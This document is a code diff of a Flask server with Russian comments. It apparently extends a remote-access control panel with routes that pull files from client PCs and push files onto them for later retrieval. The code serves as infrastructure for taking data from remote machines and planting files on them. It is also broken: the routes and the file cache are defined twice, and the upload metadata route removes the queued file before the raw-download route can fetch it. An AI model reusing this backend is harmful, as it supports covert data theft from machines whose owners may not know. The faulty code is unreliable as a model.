@@ -21,11 +21,108 @@ clients_lock = threading.Lock()
 messages = {}
 messages_lock = threading.Lock()
 
+# кэш скачанных файлов: (client, pc, path) -> bytes
+file_cache = {}
+file_cache_lock = threading.Lock()
+
+# очередь файлов, которые панель заливает НА клиента: (client, pc, id) -> {name, data}
+upload_queue = {}
+upload_lock = threading.Lock()
+
 TIMEOUT_SECONDS = 60
 PHOTOS_DIR = "photos1"
 os.makedirs(PHOTOS_DIR, exist_ok=True)
 
 # ... cleanup_clients unchanged ...
+
+# ---------- Проводник: скачивание файла с клиента ----------
+
+@app.route("/sent/file/<client>/<pc>/<path:filepath>", methods=["POST"])
+def sent_file(client, pc, filepath):
+    """Клиент присылает байты после download_file."""
+    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
+        return jsonify({"Succes": False})
+
+    data = request.get_data()
+    if not data:
+        return jsonify({"Succes": False})
+
+    with file_cache_lock:
+        file_cache[(client, pc, filepath)] = data
+    return jsonify({"Succes": True, "size": len(data)})
+
+
+@app.route("/file/<client>/<pc>/<path:filepath>", methods=["GET"])
+def get_file(client, pc, filepath):
+    """Панель забирает файл, ранее присланный клиентом."""
+    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
+        return jsonify({"Succes": False})
+
+    with file_cache_lock:
+        data = file_cache.get((client, pc, filepath))
+    if data is None:
+        return jsonify({"Succes": False, "Error": "not found"}), 404
+
+    import io as _io
+    return send_file(_io.BytesIO(data),
+                     mimetype="application/octet-stream",
+                     download_name=os.path.basename(filepath))
+
+
+# ---------- Проводник: загрузка файла НА клиента ----------
+
+@app.route("/upload/<client>/<pc>/<upload_id>/", methods=["POST"])
+def upload_to_client(client, pc, upload_id):
+    """Панель заливает файл сюда (сырые байты), клиент потом забирает."""
+    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
+        return jsonify({"Succes": False})
+
+    filename = request.headers.get("X-Filename", "file.bin")
+    data = request.get_data()
+    if not data:
+        return jsonify({"Succes": False})
+
+    with upload_lock:
+        upload_queue[(client, pc, upload_id)] = {
+            "name": filename,
+            "data": data,
+        }
+    return jsonify({"Succes": True, "id": upload_id, "size": len(data)})
+
+
+@app.route("/upload/<client>/<pc>/<upload_id>/", methods=["GET"])
+def fetch_upload(client, pc, upload_id):
+    """Клиент забирает файл, залитый панелью (после команды upload_file)."""
+    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
+        return jsonify({"Succes": False})
+
+    with upload_lock:
+        item = upload_queue.pop((client, pc, upload_id), None)
+    if item is None:
+        return jsonify({"Succes": False, "Error": "not found"}), 404
+
+    return jsonify({
+        "Succes": True,
+        "name": item["name"],
+        "size": len(item["data"]),
+        # байты отдаём отдельным запросом, чтобы не раздувать JSON
+    })
+
+
+@app.route("/upload/<client>/<pc>/<upload_id>/raw/", methods=["GET"])
+def fetch_upload_raw(client, pc, upload_id):
+    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
+        return jsonify({"Succes": False})
+
+    with upload_lock:
+        item = upload_queue.pop((client, pc, upload_id), None)
+    if item is None:
+        return jsonify({"Succes": False, "Error": "not found"}), 404
+
+    import io as _io
+    return send_file(_io.BytesIO(item["data"]),
+                     mimetype="application/octet-stream",
+                     download_name=item["name"])
 
 @app.route("/sent/message/<client>/<pc>/", methods=["POST"])
 def sent_message(client, pc):
@@ -172,10 +269,6 @@ def sent_file(client, pc, filepath):
     with file_cache_lock:
         file_cache[(client, pc, filepath)] = data
     return jsonify({"Succes": True, "size": len(data)})
-
-# кэш скачанных файлов: (client, pc, path) -> bytes
-file_cache = {}
-file_cache_lock = threading.Lock()
 
 @app.route("/file/<client>/<pc>/<path:filename>", methods=["GET"])
 def get_file(client, pc, filename):
